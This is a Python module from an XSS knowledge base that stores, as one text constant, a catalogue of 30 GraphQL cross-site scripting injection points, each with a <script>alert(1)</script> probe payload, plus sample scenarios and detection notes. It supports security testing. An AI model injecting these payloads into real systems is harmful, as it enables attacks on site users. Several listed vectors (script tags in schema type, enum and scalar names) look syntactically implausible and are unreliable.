#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-10-25 12:00:00 UTC
Status: Created
Telegram: https://t.me/easyprotech

GraphQL XSS Context - Attack Vectors Module
"""

ATTACK_VECTOR = """
GRAPHQL XSS ATTACK VECTORS:

1. QUERY PARAMETER INJECTION:
   GraphQL query with user input:
   query GetUser($id: ID!) {
     user(id: $id) {
       name
       bio
     }
   }

   Variables:
   {"id": "USER_INPUT"}  # ID injection

   If ID is reflected in response:
   {"data": {"user": {"name": "<script>alert(1)</script>", "bio": "Bio"}}}

2. FIELD ALIAS INJECTION:
   Query with alias injection:
   query {
     user_<script>alert(1)</script>: user(id: "123") {
       name
     }
   }

   Result may execute script in some parsers

3. MUTATION INPUT INJECTION:
   Mutation with user content:
   mutation UpdateProfile($input: UpdateProfileInput!) {
     updateProfile(input: $input) {
       profile {
         displayName
         status
       }
     }
   }

   Variables:
   {
     "input": {
       "displayName": "<script>alert(1)</script>",  # Display name XSS
       "status": "Active"
     }
   }

4. SUBSCRIPTION INJECTION:
   Real-time subscription with XSS:
   subscription OnUserUpdate {
     userUpdate {
       message
       content  # User-controlled content
     }
   }

   Subscription data:
   {
     "data": {
       "userUpdate": {
         "message": "Update",
         "content": "<script>alert(1)</script>"# Subscription XSS
       }
     }
   }

5. ERROR MESSAGE INJECTION:
   Malformed query leading to XSS:
   query {
     user(id: "<script>alert(1)</script>") {# Invalid ID with XSS
       name
     }
   }

   Error response:
   {"errors": [{"message": "Invalid user ID: <script>alert(1)</script>"}]}

ADVANCED GRAPHQL XSS TECHNIQUES:

6. INTROSPECTION QUERY INJECTION:
   Introspection with XSS:
   query IntrospectionQuery {
     __schema {
       queryType {
         name
         description# Description might be user-controlled
       }
     }
   }

7. FRAGMENT INJECTION:
   Fragment with malicious content:
   query {
     user(id: "123") {
       ...UserFields
     }
   }

   fragment UserFields on User {
     name
     bio_<script>alert(1)</script>: bio# Fragment alias XSS
   }

8. DIRECTIVE INJECTION:
   Directives with XSS:
   query {
     user(id: "123") @include(if: USER_INPUT) {# Directive injection
       name
     }
   }

   Attack payload:
   true) { name } <script>alert(1)</script> #

9. VARIABLE INJECTION:
   Complex variable injection:
   query GetUsers($filter: String!) {
     users(filter: $filter) {
       name
       profile {
         bio
       }
     }
   }

   Variables:
   {"filter": "name:<script>alert(1)</script>"}# Filter XSS

10. BATCH QUERY INJECTION:
    Batch queries with XSS:
    [
      {"query": "query { user(id: \\"<script>alert(1)</script>\\") { name } }"},
      {"query": "query { settings { theme } }"}
    ]

11. SCHEMA FIELD INJECTION:
    Schema with malicious field names:
    type User {
      name: String
      <script>alert(1)</script>: String# Field name XSS
    }

12. ENUM VALUE INJECTION:
    Enum with XSS values:
    enum UserStatus {
      ACTIVE
      INACTIVE
      <script>alert(1)</script># Enum value XSS
    }

13. UNION TYPE INJECTION:
    Union types with XSS:
    union SearchResult = User | Post | <script>alert(1)</script># Union XSS

14. INTERFACE INJECTION:
    Interface with malicious fields:
    interface Node {
      id: ID!
      <script>alert(1)</script>: String# Interface field XSS
    }

15. SCALAR TYPE INJECTION:
    Custom scalar with XSS:
    scalar JSON
    scalar <script>alert(1)</script># Scalar name XSS

GRAPHQL-SPECIFIC BYPASSES:

16. QUERY DEPTH INJECTION:
    Deep query with XSS:
    query {
      user(id: "123") {
        profile {
          settings {
            theme {
              name
              <script>alert(1)</script>: value# Deep field XSS
            }
          }
        }
      }
    }

17. OPERATION NAME INJECTION:
    Operation name with XSS:
    query <script>alert(1)</script> {# Operation name XSS
      user(id: "123") {
        name
      }
    }

18. COMMENT INJECTION:
    GraphQL comments with XSS:
    query {
      # <script>alert(1)</script># Comment XSS
      user(id: "123") {
        name
      }
    }

19. STRING ESCAPE BYPASS:
    Escaped strings with XSS:
    {"id": "\\"<script>alert(1)</script>\\""}# Escaped XSS

20. BLOCK STRING INJECTION:
    Block strings with XSS:
    query {
      user(id: "123") {
        bio(description: \"\"\"
          <script>alert(1)</script>  # Block string XSS
        \"\"\")
      }
    }

REAL-WORLD ATTACK SCENARIOS:

21. SOCIAL MEDIA API:
    - GraphQL API for posts
    - Post content: <script>alert(1)</script>
    - Displayed in feed
    - Feed-based XSS attacks

22. E-COMMERCE PLATFORM:
    - Product search API
    - Product name: <script>alert(1)</script>
    - Search results XSS
    - Shopping cart manipulation

23. USER PROFILE SYSTEM:
    - Profile update mutation
    - Display name: <script>alert(1)</script>
    - Profile display XSS
    - Profile-based attacks

24. CHAT APPLICATION:
    - Real-time messaging API
    - Message subscription: <script>alert(1)</script>
    - Real-time XSS via subscriptions
    - Chat hijacking

25. COLLABORATION PLATFORM:
    - Document sharing API
    - Document title: <script>alert(1)</script>
    - Document display XSS
    - Collaboration hijacking

26. ANALYTICS DASHBOARD:
    - Metrics API
    - Metric name: <script>alert(1)</script>
    - Dashboard XSS
    - Analytics manipulation

27. MOBILE APPLICATION:
    - GraphQL backend
    - Mobile app consuming API
    - API response: <script>alert(1)</script>
    - Mobile app XSS

GRAPHQL XSS DETECTION:

28. MANUAL TESTING:
    - GraphQL playground testing
    - Query introspection analysis
    - Mutation testing
    - Subscription monitoring

29. AUTOMATED SCANNING:
    - GraphQL schema analysis
    - Query injection testing
    - Response sanitization validation
    - Subscription security testing

30. PROXY MONITORING:
    - GraphQL traffic interception
    - Query/response analysis
    - Schema validation
    - Error message inspection
"""
